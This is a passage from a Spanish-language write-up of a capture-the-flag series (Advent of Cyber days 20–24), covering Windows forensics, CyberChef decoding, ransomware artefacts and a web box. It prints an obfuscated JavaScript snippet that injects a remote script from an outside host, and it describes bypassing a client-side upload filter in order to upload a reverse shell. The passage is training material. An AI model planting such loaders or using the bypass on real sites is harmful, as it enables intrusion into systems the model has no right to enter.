d--h--       11/23/2020   3:26 PM                3lfthr3e

</code></pre></td></tr></table>
</div>
</div><p>En el directorio que encontramos obtenemos la lista de archivos ocultos y el numero de &ldquo;palabras&rdquo; que contiene el primero.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows&gt; Set-Location System32<span class="se">\3</span>lfthr3e
PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue


    Directory: C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--       11/17/2020  10:58 AM          <span class="m">85887</span> 1.txt
-arh--       11/23/2020   3:26 PM       <span class="m">12061168</span> 2.txt


PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 1.txt <span class="p">|</span> Measure-Object -Word

Lines Words Characters Property 
----- ----- ---------- --------
       <span class="m">9999</span>


PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt;
</code></pre></td></tr></table>
</div>
</div><p>Obtenemos las palabras segun el <code>index</code> indicado (551 y 6991):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; <span class="o">(</span>Get-Content -Path 1.txt<span class="o">)[</span>551<span class="o">]</span>
Red
PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; <span class="o">(</span>Get-Content -Path 1.txt<span class="o">)[</span>6991<span class="o">]</span>
Ryder 
PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt;
</code></pre></td></tr></table>
</div>
</div><p>En la ultima tarea debemos de buscar las dos palabras anteriores (Red Ryder) dentro del archivo <code>2.txt</code> para ello utilizamos <code>Select-String</code> con <code>-Pattern</code> y con la ayuda de la pista dada.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 2.txt <span class="p">|</span> Select-String -pattern <span class="s2">&#34;Red Ryder&#34;</span>
PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt; Get-Content -Path 2.txt <span class="p">|</span> Select-String -Pattern <span class="s2">&#34;redryder&#34;</span>

redryderbbgun 


PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\3</span>lfthr3e&gt;
</code></pre></td></tr></table>
</div>
</div><h1 id="day-21---time-for-some-elforensics-">DAY 21 - Time for some ELForensics</h1>
<p>En el reto del dia se presentan algunos ejecutables los cuales pueden ayudar a obtener informacion e identificar archivos, el objetivo es poder encontrar el conector de la base de datos oculto utilizando tecnicas forenses-investigativas.</p>
<ul>
<li>1: Debemos de obtener el hash MD5 del archivo <code>db.exe</code> en el archivo de texto en <code>Documents\</code>.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; dir


    Directory: C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/23/2020  11:21 AM             <span class="m">63</span> db file hash.txt
-a----       11/23/2020  11:22 AM           <span class="m">5632</span> deebee.exe


PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; gc <span class="s2">&#34;db file hash.txt&#34;</span>
Filename:       db.exe
MD5 Hash:       596690FFC54AB6101932856E6A78E3A1
PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>2: obtener el hash MD5 del archivo ejecutable en <code>Documents\</code>.<br />
What is the file hash of the mysterious executable within the Documents folder?</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-FileHash -Algorithm MD5 deebee.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             5F037501FB542AD2D9B06EB12AED09F0                                       C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe


PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>3: Utilizando <code>strings</code> debemos de encontrar la flag dentro del ejecutable anterior.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; c:<span class="se">\T</span>ools<span class="se">\s</span>trings64.exe -accepteula deebee.exe <span class="p">|</span> Select-String -pattern <span class="s2">&#34;{&#34;</span>

THM<span class="o">{</span>f6187e6cb<span class="o">[</span>... snip ...<span class="o">]</span>3e108cb6f9<span class="o">}</span>


PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>4: La flag que se muestra al ejecutar el archivo anterior. Al ejecutar vemos una flag que desaparece rapidamente. Verificamos los <code>Alternate Data Streams</code> que mencionan y vemos que existe un stream llamado <code>hidedb</code>.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt; Get-Item -Path deebee.exe -Stream *


PSPath        : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe::<span class="nv">$DATA</span>
PSParentPath  : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments
PSChildName   : deebee.exe::<span class="nv">$DATA</span>
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem
PSIsContainer : False
FileName      : C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe
Stream        : :<span class="nv">$DATA</span>
Length        : <span class="m">5632</span>

PSPath        : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe:hidedb
PSParentPath  : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments
PSChildName   : deebee.exe:hidedb
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem
PSIsContainer : False
FileName      : C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments<span class="se">\d</span>eebee.exe
Stream        : hidedb
Length        : <span class="m">6144</span>



PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span class="se">\D</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><p>Ejecutamos el archivo (stream) oculto y nos muestra la flag que necesitabamos.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2117.23.14.png" alt="image" /></p>
<h1 id="day-22---elf-mceager-becomes-cyberelf-">DAY 22 - Elf McEager becomes CyberElf</h1>
<p>En el reto del dia presentan una serie de retos que consiste en decodificar cadenas de texto utilizando la herramienta CyberChef.</p>
<ul>
<li>
<p>1: <strong>What is the password to the KeePass database?</strong>, encontramos una carpeta en el escritorio la cual tiene un nombre codificado en base64, utilizamos CyberChef para obtener decodificar el texto que es la contraseña de KeePass.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.14.43.png" alt="image" /></p>
</li>
<li>
<p>2: <strong>What is the encoding method listed as the &lsquo;Matching ops&rsquo;?</strong>, en la categoria principal <em>Private</em> encontramos una contraseña la cual ya esta en texto plano, al revisar el historial vemos otra la cual parece estar codificada. Utilizando <em>Magic</em> de CyberChef vemos el tipo de codificacion (el segundo) el cual sugiere Magic podriamos utilizar.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.31.49.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.33.44.png" alt="image" /></p>
</li>
<li>
<p>3: <strong>What is the decoded password value of the Elf Server?</strong>, en la categoria <em>Networking</em> encontramos una contraseña la cual esta codificada en Hexadecimal.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.19.48.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.21.10.png" alt="image" /></p>
</li>
<li>
<p>4: <strong>What is the decoded password value for ElfMail?</strong>, en la categoria <em>eMail</em> encontramos la contraseña que esta codificada en <a href="https://www.w3schools.com/html/html_entities.asp"><code>HTML entities</code></a>.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.21.59.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.24.16.png" alt="image" /></p>
</li>
<li>
<p>5: <strong>Decode the last encoded value. What is the flag?</strong>, en la categoria <em>Recycle Bin</em> encontramos una contraseña en texto plano pero en la descripcion de esta encontramos codigo JavaScript que esta evaluando una cadena de caracteres en Unicode. Utilizamos <em>From Charcode</em> eliminando el codigo Javascript para obtener en texto plano lo que esta codificado, vemos que es codigo Javascript y dentro de este vemos tambien que hay caracteres Unicode.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.36.55.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.42.52.png" alt="image" /></p>
</li>
</ul>
<p>Obtuvimos los valores reales de los valores unicode, lo que indica una URL y un &ldquo;hash&rdquo;(?), visitamos la URL con el &ldquo;hash&rdquo; y vemos nuestra flag.<br />
<em>La pista tambien nos indica que agreguemos dos veces <code>From Charcode</code> y nos devuelve: <code>............https://gist.github.com/heavenraiza/....................1d321244c4d667446dbfd9a3298a88b8...........</code></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">somestring</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
<span class="nx">somestring</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s1">&#39;text/javascript&#39;</span><span class="p">;</span>
<span class="nx">somestring</span><span class="p">.</span><span class="nx">async</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">somestring</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">104</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">47</span><span class="p">);</span>

<span class="c1">//smestring.src = hhttps://gist.github.com/heavenraiza/
</span><span class="c1"></span>
<span class="kd">var</span> <span class="nx">alls</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">nt3</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">alls</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">;)</span> <span class="p">{</span>
  <span class="c1">//11d321244c4d667446dbfd9a3298a88b8
</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">alls</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">49</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">56</span><span class="p">))</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">nt3</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">nt3</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;head&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">somestring</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.54.04.png" alt="image" /></p>
<h1 id="day-23---the-grinch-strikes-again-">DAY 23 - The Grinch strikes again!</h1>
<p>En la descripcion del dia realizan una explicacion sobre Ransomware, Volume Shadow Copy Service y Task Scheduler, y que este malware puede hacer uso de tareas programadas. Para las diferentes tareas se hace el uso de las herramientas VSS y Task Scheduler.</p>
<ul>
<li><strong>Decrypt the fake &lsquo;bitcoin address&rsquo; within the ransom note. What is the plain text value?</strong>, en el escritorio encontramos una nota de &ldquo;rescate&rdquo; que esta &ldquo;encriptada&rdquo; pero es codificacion base64, la decodificamos y tenemos la &ldquo;direccion&rdquo; bitcoin.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I&#39;ll give you the key to decrypt. &gt;:^p</span>

sckull@tars:~$ <span class="nb">echo</span> <span class="nv">bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ</span><span class="o">==</span><span class="p">|</span>base64 -d
nomorebestfestivalcompany
sckull@tars:~$
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?</strong>, en la carpeta <code>Documents\</code> y en la particion de Backup encontramos un archivo que parece estar encriptado y su extencion es <code>.grinch</code>.</p>
</li>
<li>
<p><strong>What is the name of the suspicious scheduled task?</strong>, en <code>Scheduler Task</code> encontramos una tarea que ejecuta un ejecutable con un nombre extraño.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2319.08.07.png" alt="image" /></p>
</li>
<li>
<p><strong>Inspect the properties of the scheduled task. What is the location of the executable that is run at login?</strong>, la direccion del ejecutable.</p>
</li>
<li>
<p><strong>There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?</strong>, encontramos otra tarea que ejecuta el VSS con el nombre del ID de ShadowCopyVolume.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2319.10.39.png" alt="image" /></p>
</li>
<li>
<p><strong>Assign the hidden partition a letter. What is the name of the hidden folder?</strong>, en la particion de Backup activamos la opcion de mostrar archivos ocultos para ver la carpeta oculta.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2319.15.40.png" alt="image" /></p>
</li>
<li>
<p><strong>What is the password within the file?</strong>, en la carpeta que encontramos vemos <code>Propiedades &gt; Previous Version</code>, abrimos la carpeta y archivo que contiene la contraseña.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2319.17.55.png" alt="image" /></p>
</li>
</ul>
<h1 id="day-24---the-trial-before-christmas-">DAY 24 - The Trial Before Christmas</h1>
<p>El ultimo dia presentan una descripcion de Burpsuite, MySQL, Cracking y Privilege Escalation LXD y una maquina la cual hay que obtener las respuestas a las tareas.</p>
<ul>
<li><strong>What ports are open?</strong>: Realizamos un escaneo de puertos donde encontramos el puerto 80 y 65000 abiertos.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Dec 24 17:56:29 2020 as: nmap -p- --min-rate 1000 -o scanPorts 10.10.88.80</span>
Warning: 10.10.88.80 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 10.10.88.80 <span class="o">(</span>10.10.88.80<span class="o">)</span>
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span>.
Not shown: <span class="m">63777</span> closed ports, <span class="m">1756</span> filtered ports
PORT      STATE SERVICE
80/tcp    open  http
65000/tcp open  unknown

<span class="c1"># Nmap done at Thu Dec 24 17:59:31 2020 -- 1 IP address (1 host up) scanned in 182.67 seconds</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>What&rsquo;s the title of the hidden website?</strong>: utilizamos wfuzz para realizar una busqueda de directorios/paginas recursiva, en la primera busqueda encontramos dos paginas, realizamos una segunda busqueda utilizando el directorio/pagina <code>/3/</code> ya que <code>/codes/</code> nos muestra solo un mensaje. Al finalizar encontramos una pagina en <code>/3/9/9/2/3/6/4/</code> en el puerto 80. En el puerto <code>65000</code> encontramos un login con el titulo que buscamos.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#PUERTO 80</span>
<span class="c1">#wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 http://10.10.88.80/3/9/9/2/3/6/4/</span>
/codes/
/3/

<span class="c1">#PUERTO 650000</span>
kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
/api <span class="o">(</span>Status: 301<span class="o">)</span>
/assets <span class="o">(</span>Status: 301<span class="o">)</span>
/grid <span class="o">(</span>Status: 301<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
/uploads.php <span class="o">(</span>Status: 200<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>What is the name of the hidden php page?</strong>, con el escaneo con gobuster en el puerto 65000 encontramos la pagina, donde es posible subir archivos.</p>
</li>
<li>
<p><strong>What is the name of the hidden directory where file uploads are saved?</strong>, segun el escaneo de gobuster encontramos el directorio/pagina <code>/grid</code>.</p>
</li>
<li>
<p><strong>Bypass the filters. Upload and execute a reverse shell.</strong>, intentamos subir una imagen en la pagina pero nos detecta que no es un tipo de archivo valido, analizando el codigo fuente vemos el codigo (filter.js, upload.js) donde se &ldquo;filtran&rdquo; los tipos de archivos <code>png, jpeg, jpg</code> pero al mismo tiempo estos tipos de archivos son los aceptados segun el codigo fuente de la pagina. Para hacer bypass utilizamos la configuracion de Burpusite descrita en el reto del dia, lo que ayudaria a que el filtro (filter.js) no &ldquo;sea cargado&rdquo; (opcion de <code>Drop</code>). Al realizar lo anterior si nos aceptaria los archivos y se mostrarían en <code>/grid</code>.</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//filter.js
</span><span class="c1"></span><span class="kr">const</span> <span class="nx">filter</span> <span class="o">=</span> <span class="nx">file</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">([</span><span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">([</span><span class="s2">&#34;png&#34;</span><span class="p">,</span> <span class="s2">&#34;jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;jpg&#34;</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">).</span><span class="nx">pop</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">//Let&#39;s be honest -- these things are dangerous. May as well always return false Â¯\_(ãƒ„)_/Â¯
</span><span class="c1"></span>  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>

<span class="p">}</span>

<span class="c1">//upload.js
</span><span class="c1"></span><span class="p">[...</span> <span class="nx">snip</span> <span class="p">...</span> <span class="p">]</span>
<span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">filter</span> <span class="o">===</span> <span class="s2">&#34;function&#34;</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">filter</span><span class="p">(</span><span class="nx">file</span><span class="p">)){</span>
